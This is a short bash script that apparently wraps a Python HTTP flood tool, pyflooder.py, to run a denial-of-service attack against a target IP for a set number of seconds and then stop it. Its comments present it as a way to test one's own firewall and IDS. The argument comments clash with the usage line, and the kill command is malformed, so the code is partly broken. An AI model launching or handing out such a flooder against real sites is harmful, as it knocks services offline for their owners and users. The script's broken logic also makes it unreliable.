#!/bin/bash
# Script for Hyperion v3.x that performs DOS attack

D=$1 # IP address eg 8.8.8.8
U=$2 # user search term
T=$3 # length of attacks in seconds
# Open your web browswer and go to the target website. After about 10 seconds refresh, and see if the website
# is unavailable due to a successful HTTP Flood DOS attack. If so, you should reconfigure your firewall and IDS
# to deflect DOS attacks, ideally to a honeypot so you can collect data for your Blue Team to analyse.
# Usage pyflooder.py < Hostname > < Port > < Number_of_Attacks >
python pyflooder.py $1 $2 $3
sleep $3
kill $(grep -f 'python pyflooder.py')
clear
